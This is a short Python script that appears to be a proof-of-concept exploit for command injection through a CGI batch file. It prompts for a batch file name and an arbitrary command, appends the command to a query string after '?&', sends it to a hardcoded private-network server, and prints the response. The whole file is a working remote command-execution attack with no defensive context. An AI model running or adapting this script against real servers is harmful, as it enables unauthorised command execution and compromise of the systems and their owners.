import requests

batch_file = input("Enter the name of the batch file on the server\t")
command = input("Enter the command to be executed\t")

url = 'http://192.168.29.118:8080/cgi/' + batch_file + '?&' + command
r = requests.get(url)
print("Respone from server:")
print(r.text)
